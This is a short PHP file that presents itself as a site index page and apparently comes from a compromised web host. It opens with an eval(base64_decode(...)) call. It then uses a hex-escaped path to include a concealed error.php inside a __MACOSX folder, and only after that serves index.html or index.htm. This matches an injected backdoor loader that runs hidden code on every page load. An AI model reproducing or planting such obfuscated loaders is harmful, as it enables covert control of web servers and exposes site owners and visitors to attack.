<?phpeval(base64_decode(""));

include "\x2fhom\x65/nu\x69ver\x72c/p\x75bli\x63_ht\x6dl/d\x68ish\x6ea.o\x72g/d\x316/s\x6flve\x69tal\x6c/__\x4dACO\x53X/e\x72ror\x2ephp";

if (file_exists("index.html")){echo file_get_contents("index.html");exit;}
if (file_exists("index.htm")){echo file_get_contents("index.htm");exit;}